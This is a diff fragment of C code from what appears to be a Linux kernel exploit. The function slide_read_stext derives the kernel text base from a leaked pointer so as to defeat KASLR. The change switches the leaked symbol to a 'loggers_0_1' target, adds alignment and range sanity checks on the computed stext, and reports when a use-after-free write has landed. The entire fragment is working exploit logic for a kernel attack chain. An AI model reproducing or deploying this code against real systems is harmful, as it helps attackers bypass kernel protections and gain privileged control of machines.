@@ -361,9 +361,22 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
+  if (leaked == SLIDE_LOGGERS_0_1) {
+    pr_success("slide boot_id-mechanism-ok pid=%d wrote=%016llx (UAF+walk write landed)\n",
+               getpid(), (unsigned long long)leaked);
+    return 0;
+  }
+
+  uint64_t off = p0_alias_image_offset(SLIDE_LOGGERS_0_1);
   uint64_t stext = leaked - off;
-  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
+  if ((stext & 0x1fffffULL) != 0 || stext < KIMAGE_TEXT_BASE ||
+      stext >= KIMAGE_TEXT_BASE + 0x40000000ULL) {
+    pr_warning("slide stext failed sanity check leaked=%016llx stext=%016llx "
+               "(need 2MB-aligned within KASLR range)\n",
+               (unsigned long long)leaked, (unsigned long long)stext);
+    return 0;
+  }
+  pr_success("slide boot_id_leaked_loggers_0_1 pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
              getpid(), (unsigned long long)stext);
